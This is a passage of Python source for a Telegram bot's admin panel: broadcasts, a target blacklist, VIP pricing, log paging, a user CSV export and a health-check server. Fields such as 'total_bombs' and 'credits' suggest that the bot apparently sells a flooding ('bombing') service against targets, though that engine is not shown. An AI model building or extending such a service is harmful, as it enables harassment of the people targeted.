async def _do_bcast(m):
    users = _exec("SELECT user_id FROM users WHERE banned=0", fetch="all")
    sent = failed = 0
    s = await m.answer(f"📢 Sending to {len(users)}...")
    for r in users:
        try:
            await bot.send_message(r["user_id"], m.html_text)
            sent += 1
        except Exception: failed += 1
        await asyncio.sleep(0.05)
    try: await s.edit_text(f"✅ Sent {sent}, failed {failed}")
    except Exception: pass


@dp.callback_query(F.data == "a:black")
async def cb_black(c):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    rows = _exec("SELECT * FROM blacklist ORDER BY added_at DESC LIMIT 30", fetch="all")
    lines = [f"• <code>{r['target']}</code>" for r in rows]
    await c.message.edit_text(
        "🚫 <b>Blacklist</b>\n\n" + ("\n".join(lines) or "empty"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Add", callback_data="a:black_add"),
             InlineKeyboardButton(text="🗑 Del", callback_data="a:black_del")],
            [InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]))
    await c.answer()


@dp.callback_query(F.data == "a:black_add")
async def cb_black_add(c, state):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.blacklist_add)
    await c.message.edit_text("Target", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.blacklist_add)
async def fsm_bl_add(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    t = m.text.strip()
    _exec("INSERT OR IGNORE INTO blacklist(target,added_by,added_at) VALUES(?,?,?)",
          (t, m.from_user.id, int(time.time())))
    await state.clear()
    await m.answer(f"✅ <code>{t}</code> blacklisted", reply_markup=admin_kb())


@dp.callback_query(F.data == "a:black_del")
async def cb_black_del(c, state):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.edit_setting)
    await state.update_data(mode="black_del")
    await c.message.edit_text("Target to remove", reply_markup=admin_back_kb())
    await c.answer()


@dp.callback_query(F.data == "a:vip")
async def cb_vip(c, state):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    await state.set_state(AdminFSM.vip_uid)
    await c.message.edit_text("⭐ user_id", reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.vip_uid)
async def fsm_v_uid(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    if not m.text.strip().isdigit(): return await m.answer("numeric")
    await state.update_data(uid=int(m.text.strip()))
    await state.set_state(AdminFSM.vip_cost)
    await m.answer("VIP cost (0 = default)")


@dp.message(AdminFSM.vip_cost)
async def fsm_v_cost(m, state):
    if not is_admin(m.from_user.id): return
    if m.text.startswith("/"): return await state.clear()
    try: cost = int(m.text.strip())
    except ValueError: return await m.answer("numeric")
    d = await state.get_data()
    uid = d.get("uid")
    if not get_user(uid): await state.clear(); return await m.answer("not found")
    _exec("UPDATE users SET vip_cost=? WHERE user_id=?", (cost, uid))
    await state.clear()
    await m.answer(f"✅ vip = {cost}", reply_markup=admin_kb())


@dp.callback_query(F.data.startswith("a:logs:"))
async def cb_logs(c):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    page = int(c.data.split(":")[2])
    per = 15
    total = _exec("SELECT COUNT(*) c FROM logs", fetch="one")["c"]
    max_p = max(0, (total - 1) // per)
    page = min(page, max_p)
    rows = _exec("SELECT * FROM logs ORDER BY ts DESC LIMIT ? OFFSET ?",
                 (per, page * per), fetch="all")
    lines = []
    for r in rows:
        t = time.strftime("%m-%d %H:%M", time.localtime(r["ts"]))
        lines.append(f"{t} <code>{r['user_id']}</code> {r['action']} {r['detail'][:40]}")
    nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="⬅️", callback_data=f"a:logs:{page-1}"))
    if page < max_p: nav.append(InlineKeyboardButton(text="➡️", callback_data=f"a:logs:{page+1}"))
    kb = ([nav] if nav else []) + [[InlineKeyboardButton(text="⬅️ Admin", callback_data="a:home")]]
    await c.message.edit_text(f"📋 <b>Logs</b> ({page+1}/{max_p+1})\n\n" +
                              ("\n".join(lines) or "empty"),
                              reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    await c.answer()


@dp.callback_query(F.data == "a:export")
async def cb_export(c):
    if not is_admin(c.from_user.id): return await c.answer("no", show_alert=True)
    rows = _exec("SELECT * FROM users", fetch="all")
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["user_id","username","first_name","credits","banned",
                "total_bombs","ref_count","vip_cost","created_at"])
    for r in rows:
        w.writerow([r["user_id"], r["username"], r["first_name"], r["credits"],
                    r["banned"], r["total_bombs"], r["ref_count"],
                    r["vip_cost"], r["created_at"]])
    await c.message.answer_document(
        BufferedInputFile(buf.getvalue().encode(), filename="users.csv"),
        caption=f"📤 {len(rows)} users")
    await c.answer()


# ─────────────────────── HEALTH ───────────────────────
async def _health(request):
    return aiohttp.web.Response(text="Bot is running", content_type="text/plain", status=200)


async def _run_health():
    app = aiohttp.web.Application()
    app.router.add_get("/", _health)
    runner = aiohttp.web.AppRunner(app)
    await runner.setup()
    try:
        await aiohttp.web.TCPSite(runner, host="0.0.0.0", port=PORT).start()
        log.info("health on 0.0.0.0:%d", PORT)
    except OSError as e:
        log.error("health bind failed: %s", e)
        await runner.cleanup()
        return
    try: await asyncio.Event().wait()
    finally: await runner.cleanup()


# ─────────────────────── MAIN ───────────────────────
async def _prune_loop():
    while True:
        try: prune_logs()
        except Exception: log.exception("prune")
        await asyncio.sleep(6 * 3600)


async def main():
    init_db()
    log.info("bot starting | port=%d", PORT)
    await bot.delete_webhook(drop_pending_updates=True)
    pt = asyncio.create_task(_prune_loop())
    ht = asyncio.create_task(_run_health())
    try:
        await dp.start_polling(bot)
    finally:
        for t in (ht, pt):
            if t and not t.done(): t.cancel()
        for t in (ht, pt):
            try: await t
            except (asyncio.CancelledError, Exception): pass
        try: await bot.session.close()
        except Exception: pass
        try: _conn.close()
        except Exception: pass


if __name__ == "__main__":
    try: asyncio.run(main())
    except (KeyboardInterrupt, SystemExit): pass